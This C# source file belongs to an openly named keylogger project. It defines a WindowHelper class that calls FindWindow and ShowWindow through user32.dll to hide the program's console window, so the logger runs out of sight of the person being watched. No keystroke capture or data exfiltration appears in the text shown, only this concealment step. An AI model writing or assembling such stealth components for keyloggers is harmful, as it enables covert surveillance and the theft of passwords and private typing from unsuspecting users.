using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger
{
    static class WindowHelper
    {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string className, string windowName);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr window, int cmdShow);

        public static void HideWindow()
        {
            IntPtr window = FindWindow(null, Console.Title);

            if (window != IntPtr.Zero)
            {
                ShowWindow(window, 0);
            }
        }
    }
}
